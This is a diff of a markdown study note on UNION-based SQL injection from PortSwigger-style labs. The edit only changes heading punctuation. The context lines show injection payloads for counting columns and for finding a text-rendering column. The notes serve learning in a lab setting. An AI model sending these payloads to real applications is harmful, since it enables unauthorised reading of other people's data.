@@ -9,7 +9,7 @@ excerpt: "Using UNION SELECT to pull data out of other tables once you know the 
 
 Notes on the classic UNION-based SQLi workflow from the PortSwigger labs.
 
-## Step 1 — Find the column count
+## Step 1: Find the column count
 
 `ORDER BY` climbing until it errors, or incrementing `NULL`s:
 
@@ -19,7 +19,7 @@ Notes on the classic UNION-based SQLi workflow from the PortSwigger labs.
 ' UNION SELECT NULL,NULL,NULL--   -- no error = 3 columns
 ```
 
-## Step 2 — Find a column that holds text
+## Step 2: Find a column that holds text
 
 Replace each `NULL` with a string until the value renders on the page:
 
@@ -27,7 +27,7 @@ Replace each `NULL` with a string until the value renders on the page:
 ' UNION SELECT 'a',NULL,NULL--
 ```
 
-## Step 3 — Extract the data
+## Step 3: Extract the data
 
 Once you have a text-compatible column, pull real data:
 
